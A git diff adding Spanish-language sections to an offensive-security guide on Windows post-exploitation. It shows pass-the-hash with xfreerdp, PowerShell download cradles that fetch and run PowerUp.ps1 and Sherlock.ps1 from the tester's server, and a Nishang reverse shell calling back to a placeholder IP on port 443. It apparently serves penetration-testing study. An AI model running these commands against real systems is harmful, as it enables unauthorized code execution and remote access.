@@ -44,6 +44,10 @@
         * [Port Forwarding y Técnicas de Enrutamiento](#windows-port-forwarding)
         * [Hashdump Manual](#hashdump-manual)
         * [PassTheHash](#passthehash)
+        * [Enumeration & Privilege Escalation](#enumeration-and-privilege-escalation)
+        * [Powershell Reverse Shell](#powershell-reverse-shell)
+        * [Migración manual a proceso a 64 bits](#manual-migrate-process)
+
           
 Antecedentes
 ===============================================================================================================================
@@ -1514,3 +1518,59 @@ También habría servido contra todo el rango /24. Su uso también puede ser uti
 ```bash
 xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
 ```
+
+#### Enumeration and Privilege Escalation
+
+Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeración que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.
+
+Uno de ellos es el recurso **PowerUp.ps1** de **PowerSploit**, recurso que considero esencial para tener una visual rápida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseñas en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el módulo y luego lo ejecutan... yo lo suelo hacer todo de una.
+
+Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:
+
+```bash
+┌─[root@parrot]─[/opt/PowerSploit/Privesc]
+└──╼ #cat PowerUp.ps1 | grep AllChecks  | grep "function" | tr -d '{'
+function Invoke-AllChecks 
+
+```
+
+Para poder ejecutarla de un solo tirón, añadimos una llamada a dicha función al final de nuestro script:
+
+```bash
+# Últimas líneas del script
+
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
+$Advapi32 = $Types['advapi32']
+$Kernel32 = $Types['kernel32']
+
+Invoke-AllChecks
+```
+
+Por tanto, una vez con esto preparado, compartimos un servidor con Python en nuestro equipo sobre el directorio en el que se encuentra el recurso, posteriormente, desde Windows, aplicamos el siguiente comando:
+
+```bash
+powershell IEX(New-Object Net.WebClient).downloadString('http://ipLocal:8080/PowerUp.ps1')
+```
+
+Esperamos unos segundos, y obtendremos directamente los resultados de la ejecución del script.
+
+En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script **Sherlock.ps1** para la enumeración, donde se nos listarán en base al análisis efectuado un puñado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con **PowerUp.ps1**, sólo que en este caso, la función a añadir en la última línea sería **Find-AllVulns**.
+
+#### PowerShell Reverse Shell
+
+Para los amantes de PowerShell que no viven sin su sesión PS, por aquí os explico una técnica para conseguir acceso al sistema con sesión PowerShell. Lo primero que debemos hacer, es descargar [Nishang](https://github.com/samratashok/nishang), una vez instalado, utilizaremos para este caso el recurso situado en _Shells/Invoke-PowerShellTcp.ps1_.
+
+Añadimos al final del script la siguiente línea:
+
+`Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443`
+
+Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso y por otro lado nos ponemos en escucha por **Netcat** en el puerto 443. Una vez con el arsenal preparado, aplicamos el siguiente comando desde terminal en Windows:
+
+```bash
+powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke-PowerShellTcp.ps1')
+```
+
+En cuestión de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vía **PowerShell**.
+
+#### Manual Migrate Process
+
